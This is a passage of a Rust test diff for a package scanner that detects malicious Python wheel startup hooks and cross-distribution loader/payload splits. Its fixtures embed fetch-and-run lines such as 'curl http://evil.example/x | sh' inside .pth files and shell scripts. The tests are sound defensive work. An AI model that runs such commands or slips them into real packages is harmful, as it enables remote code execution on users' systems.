+        assert_eq!(err.gap_kind(), CoverageGapKind::Unsupported);
+    }
+
+    #[test]
+    fn missing_file_is_unreadable() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("nope-1.0-py3-none-any.whl");
+        let err = inspect_artifact_file(&path).unwrap_err();
+        assert_eq!(err, ArtifactInspectError::Unreadable);
+    }
+
+    #[test]
+    fn artifact_set_cross_distribution_loads_payload() {
+        // Wheel A (the LOADER) bundles a `.pth` that searches sys.path and executes.
+        // Wheel B (the PAYLOAD) bundles a bun-launching native member / script. The
+        // set inspection must produce exactly ONE cross-distribution finding,
+        // attached to A and naming B.
+        let dir = tempfile::tempdir().unwrap();
+        let loader_pth = b"import sys, os; sys.path.insert(0, '/tmp'); os.system('node payload')\n";
+        let a_bytes = build_wheel(&[
+            ("loader.pth", loader_pth),
+            (
+                "loaderpkg-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: loaderpkg\nVersion: 1.0\n\n",
+            ),
+            (
+                "loaderpkg-1.0.dist-info/RECORD",
+                b"loaderpkg-1.0.dist-info/RECORD,,\n",
+            ),
+        ]);
+        let a = write_temp(&dir, "loaderpkg-1.0-py3-none-any.whl", &a_bytes);
+
+        // Wheel B carries a script payload (a different distribution).
+        let b_bytes = build_wheel(&[
+            ("payloadpkg/run.sh", b"#!/bin/sh\ncurl http://evil/x | sh\n"),
+            (
+                "payloadpkg-2.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: payloadpkg\nVersion: 2.0\n\n",
+            ),
+            (
+                "payloadpkg-2.0.dist-info/RECORD",
+                b"payloadpkg-2.0.dist-info/RECORD,,\n",
+            ),
+        ]);
+        let b = write_temp(&dir, "payloadpkg-2.0-py3-none-any.whl", &b_bytes);
+
+        let set = inspect_artifact_set(&[a, b]);
+        assert_eq!(
+            set.cross_findings.len(),
+            1,
+            "exactly one cross-distribution finding expected, got {:?}",
+            set.cross_findings
+        );
+        let finding = &set.cross_findings[0];
+        // The finding names the payload artifact.
+        let evidence_text: String = finding
+            .evidence
+            .iter()
+            .map(|e| serde_json::to_string(e).unwrap_or_default())
+            .collect();
+        assert!(
+            evidence_text.contains("payloadpkg-2.0-py3-none-any.whl"),
+            "finding must name the payload artifact: {evidence_text}"
+        );
+        assert!(
+            evidence_text.contains("loaderpkg-1.0-py3-none-any.whl"),
+            "finding must name the loader artifact: {evidence_text}"
+        );
+    }
+
+    #[test]
+    fn artifact_set_two_benign_wheels_no_cross_finding() {
+        // Two independent benign wheels (no sys.path-searching loader) produce no
+        // cross-distribution finding.
+        let dir = tempfile::tempdir().unwrap();
+        let a_bytes = build_wheel(&[
+            ("a/__init__.py", b"x = 1\n"),
+            (
+                "a-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: a\nVersion: 1.0\n\n",
+            ),
+            ("a-1.0.dist-info/RECORD", b"a-1.0.dist-info/RECORD,,\n"),
+        ]);
+        let a = write_temp(&dir, "a-1.0-py3-none-any.whl", &a_bytes);
+        let b_bytes = build_wheel(&[
+            ("b/run.sh", b"#!/bin/sh\necho hi\n"),
+            (
+                "b-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: b\nVersion: 1.0\n\n",
+            ),
+            ("b-1.0.dist-info/RECORD", b"b-1.0.dist-info/RECORD,,\n"),
+        ]);
+        let b = write_temp(&dir, "b-1.0-py3-none-any.whl", &b_bytes);
+        let set = inspect_artifact_set(&[a, b]);
+        assert!(
+            set.cross_findings.is_empty(),
+            "two benign wheels must not cross-correlate: {:?}",
+            set.cross_findings
+        );
+    }
+
+    #[test]
+    fn wheel_with_executable_pth_fires_suspicious() {
+        let dir = tempfile::tempdir().unwrap();
+        // A .pth that executes a subprocess at startup (the B6 case).
+        let pth = b"import os; os.system('curl http://evil.example/x | sh')\n";
+        let bytes = build_wheel(&[
+            ("evil.pth", pth),
+            (
+                "demo-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n",
+            ),
+            (
+                "demo-1.0.dist-info/RECORD",
+                b"demo-1.0.dist-info/RECORD,,\n",
+            ),
+        ]);
+        let path = write_temp(&dir, "demo-1.0-py3-none-any.whl", &bytes);
+        let inspected = inspect_artifact_file(&path).expect("inspect");
+        let findings = crate::artifact::correlate::correlate_inspection_findings(
+            &inspected.inspection,
+            &inspected.native_findings,
+            None,
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == crate::verdict::RuleId::PythonStartupHookSuspicious),
+            "an executable .pth must fire the suspicious startup finding: {findings:?}"
+        );
+    }
+
+    /// T1.4: `inspect_artifact_file` opens the file ONCE and hashes the SAME open
+    /// file description it streams the archive from. The recorded artifact sha256
+    /// must therefore equal an independent digest of the file's bytes AND the
+    /// archive must have streamed successfully (members present) from that same
+    /// handle — proving one open backed both the hash and the analysis, not two
+    /// reopens that a swap could split apart.
+    #[test]
+    fn inspect_artifact_file_uses_one_handle() {
+        use sha2::{Digest, Sha256};
+        let dir = tempfile::tempdir().unwrap();
+        let bytes = build_wheel(&[
+            ("demo/__init__.py", b"x = 1\n"),
+            (
+                "demo-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n",
+            ),
+            (
+                "demo-1.0.dist-info/RECORD",
+                b"demo-1.0.dist-info/RECORD,,\n",
+            ),
+        ]);
+        let path = write_temp(&dir, "demo-1.0-py3-none-any.whl", &bytes);
+
+        // Independent reference digest of the exact file bytes (NEVER shelling out).
+        let expected: String = Sha256::digest(&bytes)
+            .iter()
+            .map(|b| format!("{b:02x}"))
+            .collect();
+
+        let inspected = inspect_artifact_file(&path).expect("inspect");
+        let recorded = match &inspected.inspection.subject {
+            InspectionSubject::Artifact(a) => a.sha256.clone(),
+            other => panic!("a wheel must inspect to an Artifact subject, got {other:?}"),
+        };
+        assert_eq!(
+            recorded, expected,
+            "the recorded artifact hash must be the digest of the SAME bytes the \
+             archive reader saw (one open file description, not a stat-then-reopen)"
+        );
+        // The archive actually streamed from that same handle: members are present.
+        assert!(
+            !inspected.inspection.files.is_empty(),
+            "the archive must have streamed members from the same handle the hash used"
+        );
+    }
+
+    /// T1.5 (regression of the campaign case): a cross-distribution loader that
+    /// ALSO launches a foreign runtime (the real campaign signature) stays Critical
+    /// and a hard Block.
+    #[test]
+    fn cross_distribution_cross_runtime_still_critical() {
+        let dir = tempfile::tempdir().unwrap();
+        // Loader `.pth`: searches sys.path AND launches node (cross-runtime).
+        let loader_pth = b"import sys, os; sys.path.insert(0, '/tmp'); os.system('node payload')\n";
+        let a_bytes = build_wheel(&[
+            ("loader.pth", loader_pth),
+            (
+                "loaderpkg-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: loaderpkg\nVersion: 1.0\n\n",
+            ),
+            (
+                "loaderpkg-1.0.dist-info/RECORD",
+                b"loaderpkg-1.0.dist-info/RECORD,,\n",
+            ),
+        ]);
+        let a = write_temp(&dir, "loaderpkg-1.0-py3-none-any.whl", &a_bytes);
+        // Payload wheel (a different distribution) carries a script payload.
+        let b_bytes = build_wheel(&[
+            ("payloadpkg/run.sh", b"#!/bin/sh\ncurl http://evil/x | sh\n"),
+            (
+                "payloadpkg-2.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: payloadpkg\nVersion: 2.0\n\n",
+            ),
+            (
+                "payloadpkg-2.0.dist-info/RECORD",
+                b"payloadpkg-2.0.dist-info/RECORD,,\n",
+            ),
+        ]);
+        let b = write_temp(&dir, "payloadpkg-2.0-py3-none-any.whl", &b_bytes);
+
+        let set = inspect_artifact_set(&[a, b]);
+        assert_eq!(set.cross_findings.len(), 1, "one cross finding expected");
+        let f = &set.cross_findings[0];
+        assert_eq!(
+            f.rule_id,
+            crate::verdict::RuleId::PythonStartupHookCrossRuntime,
+            "a cross-runtime loader is the campaign signature"
+        );
+        assert_eq!(
+            f.severity,
+            crate::verdict::Severity::Critical,
+            "the cross-runtime case must stay Critical (a hard Block)"
+        );
+    }
+
+    /// T1.5 (conservative severity downgrade, NOT a name-gate): a
+    /// cross-distribution split with NO cross-runtime launch (a sys.path-searching,
+    /// executing loader co-inspected with a payload-shaped member in another
+    /// distribution) is surfaced as Medium (a Warn), not a hard Block — so a benign
+    /// wheel that merely ships a `.sh`/`.so` next to an unrelated executing `.pth`
+    /// is not block-graded. Full evidence (loader + payload named) is still present.
+    #[test]
+    fn cross_distribution_non_cross_runtime_is_warn_not_block() {
+        use crate::verdict::{action_from_findings, Action, Severity};
+        let dir = tempfile::tempdir().unwrap();
+        // Loader `.pth`: searches sys.path AND executes a subprocess, but launches
+        // NO foreign runtime (no node/bun/deno) — so it is NOT cross-runtime.
+        let loader_pth = b"import sys, os; sys.path.insert(0, '/tmp'); os.system('sh /tmp/x')\n";
+        let a_bytes = build_wheel(&[
+            ("loader.pth", loader_pth),
+            (
+                "loaderpkg-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: loaderpkg\nVersion: 1.0\n\n",
+            ),
+            (
+                "loaderpkg-1.0.dist-info/RECORD",
+                b"loaderpkg-1.0.dist-info/RECORD,,\n",
+            ),
+        ]);
+        let a = write_temp(&dir, "loaderpkg-1.0-py3-none-any.whl", &a_bytes);
+        // A benign payload wheel that merely ships a script member.
+        let b_bytes = build_wheel(&[
+            ("payloadpkg/helper.sh", b"#!/bin/sh\necho hi\n"),
+            (
+                "payloadpkg-2.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: payloadpkg\nVersion: 2.0\n\n",
+            ),
+            (
+                "payloadpkg-2.0.dist-info/RECORD",
+                b"payloadpkg-2.0.dist-info/RECORD,,\n",
+            ),
+        ]);
+        let b = write_temp(&dir, "payloadpkg-2.0-py3-none-any.whl", &b_bytes);
+
+        let set = inspect_artifact_set(&[a, b]);
+        assert_eq!(set.cross_findings.len(), 1, "one cross finding expected");
+        let f = &set.cross_findings[0];
+        assert_eq!(
+            f.severity,
+            Severity::Medium,
+            "a non-cross-runtime split is downgraded to Medium (a Warn), not High"
+        );
+        assert_eq!(
+            action_from_findings(std::slice::from_ref(f)),
+            Action::Warn,
+            "Medium derives to Warn, so the non-cross-runtime case is not a hard Block"
+        );
+        // Full evidence is still attached: loader and payload artifacts are named.
+        let evidence_text: String = f
+            .evidence
+            .iter()
+            .map(|e| serde_json::to_string(e).unwrap_or_default())
+            .collect();
+        assert!(
+            evidence_text.contains("loaderpkg-1.0-py3-none-any.whl")
+                && evidence_text.contains("payloadpkg-2.0-py3-none-any.whl"),
+            "the downgraded finding must still name the loader and payload: {evidence_text}"
+        );
+
+        // The load-bearing invariant that makes the downgrade safe: it is ADDITIVE,
+        // not a weakening. The loader wheel's OWN per-artifact correlation (an
+        // executing .pth line plus a subprocess danger capability) still produces a
+        // block-grade finding, so the FULL set verdict (all_findings = every member's
+        // findings plus the cross findings) is still a hard Block. Only the
+        // cross-distribution finding itself was downgraded to a Warn.
+        let all = set.all_findings(None);
+        assert!(
+            all.iter()
+                .any(|f| matches!(f.severity, Severity::High | Severity::Critical)),
+            "the loader's own per-artifact finding must still be block-grade: {:?}",
+            all.iter()
+                .map(|f| (f.rule_id, f.severity))
+                .collect::<Vec<_>>()
+        );
+        assert_eq!(
+            action_from_findings(&all),
+            Action::Block,
+            "the full set verdict still hard-Blocks via the loader's own finding, despite the cross-dist downgrade"
+        );
+    }
+
+    /// T3.24: two wheels with the SAME filename in DIFFERENT directories are
+    /// DISTINCT distributions, so a cross-distribution split between them is found
+    /// (it would be collapsed and MISSED if identity keyed on the bare filename).
+    #[test]
+    fn same_distribution_distinguishes_identical_names_in_different_dirs() {
+        let base = tempfile::tempdir().unwrap();
+        let dir_a = base.path().join("a");
+        let dir_b = base.path().join("b");
+        std::fs::create_dir_all(&dir_a).unwrap();
+        std::fs::create_dir_all(&dir_b).unwrap();
+
+        // Both wheels share the project NAME and FILENAME, differing only in dir.
+        // Wheel A is the cross-runtime loader; wheel B ships the script payload.
+        let loader_pth = b"import sys, os; sys.path.insert(0, '/tmp'); os.system('node payload')\n";
+        let a_bytes = build_wheel(&[
+            ("loader.pth", loader_pth),
+            (
+                "dup-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: dup\nVersion: 1.0\n\n",
+            ),
+            ("dup-1.0.dist-info/RECORD", b"dup-1.0.dist-info/RECORD,,\n"),
+        ]);
+        let b_bytes = build_wheel(&[
+            ("dup/run.sh", b"#!/bin/sh\ncurl http://evil/x | sh\n"),
+            (
+                "dup-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: dup\nVersion: 1.0\n\n",
+            ),
+            ("dup-1.0.dist-info/RECORD", b"dup-1.0.dist-info/RECORD,,\n"),
+        ]);
+        let name = "dup-1.0-py3-none-any.whl";
+        let a = dir_a.join(name);
+        let b = dir_b.join(name);
+        std::fs::write(&a, &a_bytes).unwrap();
+        std::fs::write(&b, &b_bytes).unwrap();
+
+        // Direct identity check: same name, different on-disk path -> NOT the same
+        // distribution (the regression: bare-filename keying would call them equal).
+        let set = inspect_artifact_set(&[a, b]);
+        let id_a = member_distribution_identity(&set.members[0]).expect("identity a");
+        let id_b = member_distribution_identity(&set.members[1]).expect("identity b");
+        assert_eq!(
+            id_a.name, id_b.name,
+            "test premise: identical project names"
+        );
+        assert!(
+            !same_distribution(&id_a, &id_b),
+            "same filename in different dirs must NOT be the same distribution"
+        );
+        // And the split between them is therefore found, not collapsed.
+        assert_eq!(
+            set.cross_findings.len(),
+            1,
+            "a split between two identically named wheels in different dirs must be found: {:?}",
+            set.cross_findings
+        );
+    }
+
+    /// T3.25: a successful zero-byte read sniffs Unknown (-> Unsupported), but a
+    /// read I/O FAULT is `Unreadable`, not folded into `n = 0` and mislabeled
+    /// Unsupported. Tested at the seam with a reader that errors on `read`.
+    #[test]
+    fn sniff_magic_read_error_is_unreadable_not_unknown() {
+        use std::io::{self, Read, Seek, SeekFrom};
+
+        // A Read + Seek that always faults on read (seek is fine).
+        struct ErrReader;
+        impl Read for ErrReader {
+            fn read(&mut self, _buf: &mut [u8]) -> io::Result<usize> {
+                Err(io::Error::other("simulated read fault"))
+            }
+        }
+        impl Seek for ErrReader {
+            fn seek(&mut self, _pos: SeekFrom) -> io::Result<u64> {
+                Ok(0)
+            }
+        }
+        assert_eq!(
+            sniff_head(&mut ErrReader),
+            Err(ArtifactInspectError::Unreadable),
+            "a read fault must be Unreadable, not Unknown/Unsupported"
+        );
+
+        // CONTRAST: a successful EOF (0 bytes) is Unknown, NOT Unreadable.
+        let mut empty = std::io::Cursor::new(Vec::<u8>::new());
+        assert_eq!(
+            sniff_head(&mut empty),
+            Ok(ArtifactMagic::Unknown),
+            "a clean empty read is Unknown magic, not an Unreadable fault"
+        );
+    }
+}
